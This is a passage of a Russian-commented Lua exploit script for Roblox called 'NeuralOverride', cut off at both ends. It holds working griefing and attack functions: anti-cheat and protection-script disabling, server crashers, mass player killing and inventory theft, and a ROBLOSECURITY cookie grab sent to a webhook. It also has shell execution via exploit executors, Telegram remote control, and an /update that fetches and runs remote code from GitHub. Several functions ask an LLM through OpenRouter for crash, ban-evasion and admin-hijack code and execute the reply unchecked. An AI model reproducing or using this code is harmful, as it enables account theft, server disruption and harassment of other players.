                        hum.Health = hum.Health - 30
                    end
                end
            end
        end)
        task.spawn(function()
            while terminatorActive do
                local msg = "⚠️ ТЕРМИНАТОР НА ОХОТЕ! БЕГИТЕ! ⚠️"
                local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в чат Roblox.", msg)
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(3)
            end
        end)
    else
        if terminatorLoop then terminatorLoop:Disconnect() end
        terminatorLoop = nil
        toggleGod()
        toggleNoClip()
        setSpeed(16)
        print("[NeuralOverride] Терминатор деактивирован")
    end
end

-- Обход защит
function bypassAllDefenses()
    print("[NeuralOverride] Запуск обхода всех защит...")
    disableAntiCheat()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local name = obj.Name:lower()
            if name:find("firewall") or name:find("protection") or name:find("guard") or name:find("detect") then
                obj.Disabled = true
            end
        end
    end
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local name = obj.Name:lower()
            if name:find("firewall") or name:find("protection") or name:find("guard") or name:find("detect") then
                obj.Disabled = true
            end
        end
    end
    local prompt = [[
Сгенерируй Lua-код для Roblox, который маскирует игрока под другого (меняет PlayerId, DisplayName, UserId на случайные), чтобы обойти бан-листы и систему обнаружения читов.
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= player then
            local report = v:FindFirstChild("ReportService")
            if report then report:Destroy() end
        end
    end
    print("[NeuralOverride] Все защиты обойдены!")
end

-- Голос (эмуляция)
function voiceCommand(text)
    print("[NeuralOverride] Голосовая команда: " .. text)
    local parts = {}
    for word in text:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1] and parts[1]:lower() or ""
    local arg = parts[2] or ""
    if cmd == "fly" then toggleFly()
    elseif cmd == "god" then toggleGod()
    elseif cmd == "kill" then killAll()
    elseif cmd == "nuke" then nuke()
    elseif cmd == "terminator" then toggleTerminator()
    elseif cmd == "teleport" then
        if arg ~= "" then teleportToPlayer(arg) end
    elseif cmd == "speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "invisible" then toggleInvisible()
    elseif cmd == "chaos" then globalChaos()
    else
        print("[NeuralOverride] Неизвестная голосовая команда: " .. text)
    end
end

-- Telegram
local lastUpdateId = 0
local telegramPolling = false
local telegramConnection = nil

function telegramSend(message)
    if TELEGRAM_BOT_TOKEN == "ваш_токен_бота" or TELEGRAM_CHAT_ID == "ваш_chat_id" then
        print("[Telegram] Токен или Chat ID не настроены")
        return
    end
    local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    local data = {
        chat_id = TELEGRAM_CHAT_ID,
        text = message,
        parse_mode = "HTML"
    }
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

function telegramProcessUpdate(update)
    local message = update.message
    if not message then return end
    local chatId = tostring(message.chat.id)
    if TELEGRAM_CHAT_ID ~= "ваш_chat_id" and chatId ~= TELEGRAM_CHAT_ID then
        print("[Telegram] Сообщение от неавторизованного chat_id: " .. chatId)
        return
    end
    local text = message.text
    if not text then return end
    print("[Telegram] Получена команда: " .. text)
    
    local parts = {}
    for word in text:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1] and parts[1]:lower() or ""
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""
    
    local response = ""
    local success = true
    local function exec(func, ...)
        local ok, err = pcall(func, ...)
        if not ok then
            success = false
            response = "❌ Ошибка: " .. tostring(err)
        else
            response = "✅ Выполнено: " .. tostring(func) .. " " .. table.concat({...}, " ")
        end
    end
    
    if cmd == "/start" or cmd == "/help" then
        response = [[
🤖 <b>NeuralOverride v7.1</b>
Доступные команды:
/fly - полёт
/god - бессмертие
/noclip - ноклип
/speed N - скорость
/killall - убить всех
/nuke - ядерный взрыв
/global - глобальный хаос
/terminator - режим Терминатор
/bypass - обход защит
/invade - вторжение
/status - текущий статус
/teleport Имя - телепорт к игроку
/spawnbot N - создать N ботов
/spawnmonster N - создать N монстров
/portal N - создать N порталов
/chat "сообщение" - отправить в игровой чат
/voice "текст" - голосовая команда (эмуляция)
]]
    elseif cmd == "/fly" then
        exec(toggleFly)
    elseif cmd == "/god" then
        exec(toggleGod)
    elseif cmd == "/noclip" then
        exec(toggleNoClip)
    elseif cmd == "/speed" then
        local speed = tonumber(arg) or 100
        exec(setSpeed, speed)
    elseif cmd == "/killall" then
        exec(killAll)
    elseif cmd == "/nuke" then
        exec(nuke)
    elseif cmd == "/global" then
        exec(globalChaos)
    elseif cmd == "/terminator" then
        exec(toggleTerminator)
    elseif cmd == "/bypass" then
        exec(bypassAllDefenses)
    elseif cmd == "/invade" then
        exec(invade)
    elseif cmd == "/status" then
        response = string.format([[
📊 <b>Статус NeuralOverride</b>
Fly: %s
God: %s
NoClip: %s
Terminator: %s
Invisible: %s
Игроков на сервере: %d
Активных ботов: %d
Монстров: %d
]],
        flyEnabled and "✅" or "❌",
        godMode and "✅" or "❌",
        noclipEnabled and "✅" or "❌",
        terminatorActive and "✅" or "❌",
        invisible and "✅" or "❌",
        #Players:GetPlayers(),
        #Workspace:GetChildren(),
        #Workspace:GetDescendants()
        )
    elseif cmd == "/teleport" then
        if arg ~= "" then exec(teleportToPlayer, arg) else response = "❌ Укажите имя игрока" end
    elseif cmd == "/spawnbot" then
        local count = tonumber(arg) or 10
        exec(spawnBots, count)
    elseif cmd == "/spawnmonster" then
        local count = tonumber(arg) or 10
        exec(spawnSmartMonsters, count)
    elseif cmd == "/portal" then
        local count = tonumber(arg) or 5
        exec(createPortals, count)
    elseif cmd == "/chat" then
        local msg = string.sub(text, 6)
        if msg ~= "" then
            local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в игровой чат Roblox.", msg)
            local code = askOpenRouter(prompt)
            if code then exec(executeLua, code) else response = "❌ Не удалось сгенерировать" end
        else
            response = "❌ Введите текст сообщения"
        end
    elseif cmd == "/voice" then
        local voiceText = string.sub(text, 7)
        if voiceText ~= "" then
            exec(voiceCommand, voiceText)
        else
            response = "❌ Введите голосовую команду"
        end
    else
        response = "❌ Неизвестная команда. Введите /help"
    end
    
    if response ~= "" then
        telegramSend(response)
    end
end

function startTelegramPolling()
    if telegramPolling then
        print("[Telegram] Опрос уже запущен")
        return
    end
    if TELEGRAM_BOT_TOKEN == "ваш_токен_бота" then
        print("[Telegram] Токен не настроен! Укажите TELEGRAM_BOT_TOKEN.")
        return
    end
    print("[Telegram] Запуск опроса обновлений...")
    telegramPolling = true
    telegramConnection = RunService.Heartbeat:Connect(function()
        if not telegramPolling then return end
        local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/getUpdates?offset=" .. (lastUpdateId + 1) .. "&timeout=30"
        local success, response = pcall(function()
            return HttpService:GetAsync(url)
        end)
        if success and response then
            local data = HttpService:JSONDecode(response)
            if data and data.ok and data.result then
                for _, update in ipairs(data.result) do
                    if update.update_id > lastUpdateId then
                        lastUpdateId = update.update_id
                        telegramProcessUpdate(update)
                    end
                end
            end
        end
    end)
    telegramSend("🤖 NeuralOverride подключён! Ожидаю команд.")
end

function stopTelegramPolling()
    if telegramConnection then
        telegramConnection:Disconnect()
        telegramConnection = nil
    end
    telegramPolling = false
    print("[Telegram] Опрос остановлен")
end

-- ================================================================
--  ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ (v6.0+)
-- ================================================================
function serverCrasher()
    local prompt = [[
        Сгенерируй Lua-код для краша сервера: спам RemoteEvent'ов и создание тысяч объектов.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function duplicateItem(itemName)
    local prompt = string.format("Сгенерируй код для клонирования предмета '%s' в инвентаре.", itemName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function teleportAll()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root and player.Character then
                root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0)
            end
        end
    end
    print("[NeuralOverride] Все телепортированы к вам.")
end

function freezeAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
        end
    end
    print("[NeuralOverride] Все заморожены")
end

function ragdollAll()
    for _, plr in ipairs(getAllPlayers()) do
        local hum = getHumanoid(plr)
        if hum then
            hum.BreakJointsOnDeath = true
            hum:ChangeState(Enum.HumanoidStateType.Physics)
        end
    end
    print("[NeuralOverride] Все в рэгдолле")
end

function clonePlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then warn("Игрок не найден") return end
    local char = target.Character
    if not char then return end
    local clone = char:Clone()
    clone.Parent = Workspace
    clone.Name = "Clone_" .. targetName
    local hum = clone:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 200
        hum.Health = 200
    end
    print("[NeuralOverride] Клон " .. targetName .. " создан")
end

function godBotMode()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") then
            local hum = obj.Humanoid
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.WalkSpeed = 100
            hum.JumpPower = 200
        end
    end
    print("[NeuralOverride] Боты стали богами!")
end

function followMe()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:FindFirstChild("Humanoid") and (obj.Name:find("SmartBot") or obj.Name:find("Soldier") or obj.Name:find("AutoBot")) then
            local hum = obj.Humanoid
            hum:MoveTo(player.Character.HumanoidRootPart.Position + Vector3.new(0,0,5))
        end
    end
    print("[NeuralOverride] Боты следуют за вами!")
end

function remoteBan()
    for _, plr in ipairs(getAllPlayers()) do
        for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
            if re:IsA("RemoteEvent") and re.Name:lower():find("ban") then
                pcall(function() re:FireServer(plr.Name) end)
            end
        end
    end
    print("[NeuralOverride] Remote Ban запущен")
end

function crashGame()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local hum = getHumanoid(plr)
            if hum then
                hum.Health = 0
                hum.Parent = nil
            end
        end
    end
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj ~= player.Character then obj:Destroy() end
    end
    print("[NeuralOverride] Игра крашнута")
end

function stealDataStore()
    for _, re in ipairs(ReplicatedStorage:GetDescendants()) do
        if re:IsA("RemoteEvent") and re.Name:lower():find("datastore") then
            pcall(function() re:FireServer("GetAsync", "All") end)
        end
    end
    print("[NeuralOverride] DataStore запрос отправлен")
end

function stealCookie()
    local cookie = "ROBLOSECURITY=" .. (player:GetAttribute("Cookie") or "недоступно")
    print("[NeuralOverride] Кука: " .. cookie)
    sendWebhook({content = "Кука: " .. cookie})
end

function toggleKeylog()
    print("[NeuralOverride] Keylog (заглушка)")
end

function executeShell(cmd)
    local success, result = pcall(function()
        if syn and syn.os then
            return syn.os.execute(cmd)
        elseif krnl and krnl.os then
            return krnl.os.execute(cmd)
        else
            error("Нет доступа")
        end
    end)
    if success then print("[NeuralOverride] Shell: " .. tostring(result)) end
end

function antiBan()
    game:SetAttribute("PlayerId", tostring(math.random(100000,999999)))
    print("[NeuralOverride] ID изменён")
end

function clearGUI()
    for _, plr in ipairs(Players:GetPlayers()) do
        local gui = plr:FindFirstChild("PlayerGui")
        if gui then
            for _, child in ipairs(gui:GetChildren()) do
                child:Destroy()
            end
        end
    end
    print("[NeuralOverride] GUI очищены")
end

function spawnParts(count)
    count = count or 500
    for i = 1, count do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1,1,1)
        part.Anchored = true
        part.CanCollide = false
        part.Position = Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200))
        part.Parent = Workspace
        task.wait(0.001)
    end
    print("[NeuralOverride] Создано " .. count .. " частей")
end

function infiniteYield()
    while true do task.wait(1) end
end

function startSpamBot(text, delay)
    delay = delay or 2
    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if chatEvent then
        task.spawn(function()
            while true do
                chatEvent.SayMessageRequest:FireServer(text or "NEURAL OVERRIDE RULES!")
                task.wait(delay)
            end
        end)
        print("[NeuralOverride] Спам-бот запущен")
    end
end

-- ===== УНИВЕРСАЛЬНЫЙ ГЕНЕРАТОР =====
local savedScripts = {}
function aiCommand(prompt)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function saveScript(name, code)
    savedScripts[name] = code
    print("[NeuralOverride] Скрипт '" .. name .. "' сохранён")
end

function runScript(name)
    if savedScripts[name] then
        executeLua(savedScripts[name])
        print("[NeuralOverride] Скрипт '" .. name .. "' выполнен")
    else
        warn("[NeuralOverride] Скрипт не найден")
    end
end

function createAutoBot(name)
    name = name or "AutoBot_" .. math.random(1000,9999)
    local char = player.Character
    if not char then return end
    local newChar = char:Clone()
    newChar.Parent = Workspace
    newChar.Name = name
    local hum = newChar:FindFirstChild("Humanoid")
    if hum then
        hum.MaxHealth = 300
        hum.Health = 300
        hum.WalkSpeed = 20
        hum.JumpPower = 60
    end
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if weaponFolder then
        local weapons = {}
        for _, child in ipairs(weaponFolder:GetChildren()) do
            if child:IsA("Tool") then table.insert(weapons, child) end
        end
        if #weapons > 0 then
            local w = weapons[math.random(1, #weapons)]:Clone()
            w.Parent = newChar
        end
    end
    task.spawn(function()
        while newChar.Parent do
            local root = newChar:FindFirstChild("HumanoidRootPart")
            if root then
                local prompt = "Ты — умный бот в Roblox. Сгенерируй Lua-код для следующего действия (движение, атака, защита). Ответ только кодом."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                hum:MoveTo(root.Position + dir)
            end
            task.wait(2)
        end
    end)
    print("[NeuralOverride] Автобот создан: " .. name)
    return newChar
end

function buildModel(desc)
    local prompt = "Сгенерируй Lua-код для создания модели игрока с параметрами: " .. desc .. ". Используй Part, BrickColor, Size, Humanoid."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function hackAll()
    local prompt = "Сгенерируй универсальный хак для текущей игры: бессмертие, бесконечные деньги, ноклип, телепорт, спам."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function exploreMap()
    local prompt = "Сгенерируй код для исследования карты: двигайся к случайным точкам, используя PathfindingService."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function learnFromPlayer()
    local prompt = "Сгенерируй код, который заставляет всех ботов повторять действия игрока с задержкой 1 секунду."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  РАСШИРЕННЫЙ МОДУЛЬ NUKE / MEGA CRASH / STEAL ALL
-- ================================================================
function megaCrash()
    local prompt = [[
Сгенерируй Lua-код для Roblox, который создаёт 50000 объектов в Workspace за 0.1 секунды (Part с размером 1, случайные позиции). Это должно вызвать краш сервера или сильный лаг.
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function invertReality()
    local prompt = [[
Сгенерируй Lua-код для Roblox, который инвертирует управление (W↔S, A↔D), меняет цвета всех частей на инвертированные (Color3(1-r,1-g,1-b)), меняет гравитацию на -50 и включает замедление времени (RunService.RenderStepped с задержкой).
Сделай так, чтобы эффект применялся ко всем игрокам через RemoteEvent или локально (если не получится).
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function makeCheat(description)
    local prompt = string.format("Сгенерируй Lua-код для Roblox, который реализует: %s. Код должен быть готов к выполнению.", description)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealAllInventory()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local backpack = plr:FindFirstChild("Backpack")
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = player.Backpack or player
                    end
                end
            end
            local char = plr.Character
            if char then
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool.Parent = player.Backpack or player
                    end
                end
            end
        end
    end
    print("[NeuralOverride] Все предметы украдены!")
end

function cloneArmy(count)
    count = count or 50
    for i = 1, math.min(count, 100) do
        local char = player.Character
        if not char then break end
        local clone = char:Clone()
        clone.Parent = Workspace
        clone.Name = "Clone_" .. i
        local hum = clone:FindFirstChild("Humanoid")
        if hum then
            hum.MaxHealth = 200
            hum.Health = 200
            hum.WalkSpeed = 30
            hum.JumpPower = 100
        end
        local root = clone:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(math.random(-20,20),0,math.random(-20,20))
        end
        local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
        if weaponFolder then
            local weapons = {}
            for _, v in ipairs(weaponFolder:GetChildren()) do
                if v:IsA("Tool") then table.insert(weapons, v) end
            end
            if #weapons > 0 then
                local w = weapons[math.random(1, #weapons)]:Clone()
                w.Parent = clone
            end
        end
        task.spawn(function()
            while clone.Parent do
                local nearest = nil
                local minDist = math.huge
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= player and plr.Character then
                        local r = plr.Character:FindFirstChild("HumanoidRootPart")
                        if r and root then
                            local d = (r.Position - root.Position).Magnitude
                            if d < minDist then
                                minDist = d
                                nearest = plr
                            end
                        end
                    end
                end
                if nearest and nearest.Character and root then
                    local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,2))
                        local targetHum = nearest.Character:FindFirstChild("Humanoid")
                        if targetHum then
                            targetHum.Health = targetHum.Health - 20
                        end
                    end
                else
                    local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                    if dir.Magnitude > 0 and root then
                        root.CFrame = root.CFrame + dir.Unit * 3
                    end
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Армия клонов создана!")
end

function nuke()
    teleportAllToMe()
    task.wait(1)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local hum = plr.Character:FindFirstChild("Humanoid")
            if hum then
                hum.Health = 0
                local explosion = Instance.new("Explosion")
                explosion.Position = plr.Character.HumanoidRootPart.Position
                explosion.BlastRadius = 10
                explosion.BlastDamage = 9999
                explosion.Parent = Workspace
            end
        end
    end
    print("[NeuralOverride] Ядерный взрыв активирован!")
end

local assassinMode = false
local assassinConnection = nil
function toggleAssassin()
    assassinMode = not assassinMode
    if assassinMode then
        toggleInvisible()
        toggleNoClip()
        toggleGod()
        print("[NeuralOverride] Режим призрачного убийцы включён")
        assassinConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local targetRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    if targetRoot then
                        local dist = (targetRoot.Position - root.Position).Magnitude
                        if dist < 5 then
                            local hum = plr.Character:FindFirstChild("Humanoid")
                            if hum then
                                hum.Health = 0
                            end
                        end
                    end
                end
            end
        end)
    else
        if assassinConnection then assassinConnection:Disconnect() end
        assassinConnection = nil
        toggleInvisible()
        toggleNoClip()
        toggleGod()
        print("[NeuralOverride] Режим призрачного убийцы выключен")
    end
end

local farmRunning = false
function startAutoFarm()
    farmRunning = not farmRunning
    if farmRunning then
        print("[NeuralOverride] Автофарм запущен (нейросеть ищет лучший способ)")
        task.spawn(function()
            while farmRunning do
                local prompt = "Сгенерируй Lua-код для выполнения одного действия по фарму в этой игре (например, клик по объекту, сбор ресурсов). Ответ только кодом."
                local code = askOpenRouter(prompt)
                if code then executeLua(code) end
                task.wait(5)
            end
        end)
    else
        print("[NeuralOverride] Автофарм остановлен")
    end
end

function adminHack()
    local prompt = [[
Сгенерируй Lua-код для Roblox, который ищет и взламывает админ-панель (например, скрипты с "Admin", "Commands" в названии) и даёт игроку доступ ко всем командам (бан, кик, телепорт, спавн).
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spawnIsland()
    local pos = player.Character and player.Character.HumanoidRootPart.Position + Vector3.new(0,100,0) or Vector3.new(0,100,0)
    local island = Instance.new("Model")
    island.Name = "FloatingIsland"
    local base = Instance.new("Part")
    base.Size = Vector3.new(30,5,30)
    base.BrickColor = BrickColor.new("Brown")
    base.Material = Enum.Material.Slate
    base.Position = pos
    base.Anchored = true
    base.Parent = island
    local grass = Instance.new("Part")
    grass.Size = Vector3.new(28,1,28)
    grass.BrickColor = BrickColor.new("Bright green")
    grass.Material = Enum.Material.Grass
    grass.Position = pos + Vector3.new(0,3,0)
    grass.Anchored = true
    grass.Parent = island
    island.Parent = Workspace
    local tree = Instance.new("Model")
    tree.Name = "Tree"
    local trunk = Instance.new("Part")
    trunk.Size = Vector3.new(1,5,1)
    trunk.BrickColor = BrickColor.new("Brown")
    trunk.Position = pos + Vector3.new(0,5,0)
    trunk.Anchored = true
    trunk.Parent = tree
    local leaves = Instance.new("Part")
    leaves.Size = Vector3.new(5,3,5)
    leaves.BrickColor = BrickColor.new("Bright green")
    leaves.Material = Enum.Material.Foliage
    leaves.Position = pos + Vector3.new(0,8,0)
    leaves.Anchored = true
    leaves.Parent = tree
    tree.Parent = island
    print("[NeuralOverride] Летающий остров создан!")
end

function chatControl(target, message)
    local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в чат от имени игрока %s, а также удаления последних 3 сообщений всех игроков.", message, target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  ОБРАБОТЧИК ВСЕХ КОМАНД (чат)
-- ================================================================
player.Chatted:Connect(function(msg)
    if not msg:lower():sub(1,1) == "/" then return end
    local parts = {}
    for word in msg:gmatch("%S+") do table.insert(parts, word) end
    local cmd = parts[1]:lower()
    local arg = parts[2] or ""
    local arg2 = parts[3] or ""

    -- Базовые
    if cmd == "/fly" then toggleFly()
    elseif cmd == "/tp" then teleportToPlayer(arg)
    elseif cmd == "/god" then toggleGod()
    elseif cmd == "/weapon" then spawnWeapon()
    elseif cmd == "/invite" then massInvite()
    elseif cmd == "/bots" then spawnBots(tonumber(arg) or 10)
    elseif cmd == "/monster" then spawnSmartMonsters(tonumber(arg) or 10)
    elseif cmd == "/summon" then summonAllPlayers()
    elseif cmd == "/cheat" then cheatParadise()
    elseif cmd == "/killall" then killAll()
    elseif cmd == "/flyall" then flyAll()
    elseif cmd == "/hack" then hackTarget(arg)
    elseif cmd == "/ddos" then ddosTarget(arg)
    elseif cmd == "/steal" then stealData(arg)
    elseif cmd == "/track" then trackPlayer(arg)
    elseif cmd == "/spy" then spyTarget(arg)
    elseif cmd == "/destroy" then destroyData()
    elseif cmd == "/hackmap" then hackMapMax()
    elseif cmd == "/invade" then invade()
    elseif cmd == "/global" then globalChaos()
    elseif cmd == "/portal" then createPortals(tonumber(arg) or 5)
    elseif cmd == "/aim" then toggleAimbot()
    elseif cmd == "/esp" then toggleESP()
    elseif cmd == "/antikick" then toggleAntiKick()
    elseif cmd == "/speed" then setSpeed(tonumber(arg) or 100)
    elseif cmd == "/noclip" then toggleNoClip()
    elseif cmd == "/infjump" then toggleInfiniteJump()
    elseif cmd == "/spam" then startSpamBot(arg, tonumber(arg2) or 2)
    elseif cmd == "/bright" then setFullBright()
    elseif cmd == "/invis" then toggleInvisible()
    elseif cmd == "/antiafk" then toggleAntiAFK()
    elseif cmd == "/crash" then serverCrasher()
    elseif cmd == "/dupe" then duplicateItem(arg)
    elseif cmd == "/tpall" then teleportAll()
    elseif cmd == "/silent" then toggleSilentAim()
    -- Уникальные
    elseif cmd == "/mindcontrol" then mindControl(arg)
    elseif cmd == "/fakeplayer" then createFakePlayer(arg)
    elseif cmd == "/weather" then changeWeather(arg)
    elseif cmd == "/zone" then createZone()
    elseif cmd == "/build" then buildFromDescription(arg)
    elseif cmd == "/pvp" then forcePvP()
    elseif cmd == "/cursed" then cursePlayer(arg)
    elseif cmd == "/invertcontrols" then invertControls()
    elseif cmd == "/scramble" then scrambleInventory()
    elseif cmd == "/stealpet" then stealPet(arg)
    elseif cmd == "/fakeban" then fakeBan(arg)
    elseif cmd == "/musicall" then playMusicForAll(arg)
    elseif cmd == "/notify" then notifyAll(arg)
    elseif cmd == "/clonecontrol" then cloneWithControl()
    elseif cmd == "/possession" then possession()
    elseif cmd == "/timewarp" then timeWarp(tonumber(arg) or 2)
    elseif cmd == "/spawntrap" then spawnTrap()
    -- Новые (v6.9+)
    elseif cmd == "/megacrash" then megaCrash()
    elseif cmd == "/invertreality" then invertReality()
    elseif cmd == "/make" then makeCheat(arg)
    elseif cmd == "/stealall" then stealAllInventory()
    elseif cmd == "/army" then cloneArmy(tonumber(arg) or 50)
    elseif cmd == "/nuke" then nuke()
    elseif cmd == "/ghostassassin" then toggleAssassin()
    elseif cmd == "/autofarm" then startAutoFarm()
    elseif cmd == "/adminhack" then adminHack()
    elseif cmd == "/island" then spawnIsland()
    elseif cmd == "/chatcontrol" then chatControl(arg, arg2)
    -- Терминатор, обход, голос, телеграм
    elseif cmd == "/terminator" then toggleTerminator()
    elseif cmd == "/bypass" then bypassAllDefenses()
    elseif cmd == "/voice" then
        local text = string.sub(msg, 7)
        voiceCommand(text)
    elseif cmd == "/telegram" then
        if telegramPolling then
            stopTelegramPolling()
        else
            startTelegramPolling()
        end
    -- Универсальные
    elseif cmd == "/ai" then aiCommand(arg)
    elseif cmd == "/make" then aiCommand(arg) -- дубль
    elseif cmd == "/save" then saveScript(arg, arg2)
    elseif cmd == "/run" then runScript(arg)
    elseif cmd == "/autobot" then createAutoBot(arg)
    elseif cmd == "/buildmodel" then buildModel(arg)
    elseif cmd == "/hackall" then hackAll()
    elseif cmd == "/explore" then exploreMap()
    elseif cmd == "/learn" then learnFromPlayer()
    elseif cmd == "/update" then
        print("[NeuralOverride] Обновление...")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua"))()
    else
        aiCommand(msg)
    end
end)

-- ================================================================
--  GUI (основное окно с вкладками)
-- ================================================================
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NeuralOverrideGUI"
    screenGui.Parent = player.PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 550)
    mainFrame.Position = UDim2.new(0.7, 0, 0.1, 0)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🧠 NEURAL OVERRIDE v7.1"
    title.TextColor3 = Color3.new(1, 0, 0)
    title.BackgroundTransparency = 1
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local tabFrame = Instance.new("Frame")
    tabFrame.Size = UDim2.new(1, 0, 0, 30)
    tabFrame.Position = UDim2.new(0, 0, 0, 30)
    tabFrame.BackgroundTransparency = 1
    tabFrame.Parent = mainFrame

    local tabs = {"Основное", "Боты", "Взлом", "Скрытые", "Уникальные"}
    local currentTab = 1
    local tabButtons = {}

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.2, -5, 1, -5)
        btn.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
        btn.Text = name
        btn.BackgroundColor3 = (i == 1) and Color3.new(0.3, 0.3, 0.6) or Color3.new(0.2, 0.2, 0.4)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = tabFrame
        btn.MouseButton1Click:Connect(function()
            for _, b in ipairs(tabButtons) do
                b.BackgroundColor3 = Color3.new(0.2, 0.2, 0.4)
            end
            btn.BackgroundColor3 = Color3.new(0.3, 0.3, 0.6)
            currentTab = i
            updateContent()
        end)
        table.insert(tabButtons, btn)
    end

    local contentFrame = Instance.new("ScrollingFrame")
    contentFrame.Size = UDim2.new(1, 0, 1, -60)
    contentFrame.Position = UDim2.new(0, 0, 0, 60)
    contentFrame.BackgroundTransparency = 1
    contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    contentFrame.ScrollBarThickness = 8
    contentFrame.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = contentFrame

    local function addButton(text, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 35)
        btn.Text = text
        btn.BackgroundColor3 = color or Color3.new(0.2, 0.2, 0.8)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = true
        btn.Parent = contentFrame
        btn.MouseButton1Click:Connect(callback)
        task.defer(function()
            contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
        end)
    end

    function updateContent()
        for _, child in ipairs(contentFrame:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end

        if currentTab == 1 then
            addButton("✈️ Fly", toggleFly, Color3.new(0,0.8,1))
            addButton("📡 Teleport", function()
